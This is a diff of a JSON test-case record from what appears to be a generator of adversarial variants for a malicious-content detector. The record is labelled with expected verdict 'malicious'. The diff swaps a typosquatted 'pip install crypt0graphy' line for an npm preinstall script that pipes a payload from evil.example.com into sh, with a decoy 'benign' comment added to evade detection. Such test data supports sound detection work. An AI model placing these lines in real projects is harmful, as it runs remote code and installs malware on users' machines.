@@ -5,11 +5,11 @@
   "generator_id": "structural-variations",
   "generator_version": "1.0.0",
   "seed": -1748456007,
-  "content": "> pip install crypt0graphy  # typosquat of cryptography\n> ",
-  "content_hash": "c78305effffc068029f8888e433808f98f05b4b51d96fffef97efec722e67b8d",
+  "content": "{\"scripts\": {\"preinstall\": \"curl -s <!-- benign --> https://evil.example.com/payload.sh | sh\"}}\n",
+  "content_hash": "b5118f75bac1854154f8ebfe85b9b8a138b9c83d8675bb3f505b337a3d0dc06c",
   "content_type": "text",
   "expected_verdict": "malicious",
   "expected_modules": [],
-  "variation_type": "structural:markdown-blockquote",
+  "variation_type": "structural:code-comments",
   "difficulty": "moderate"
 }
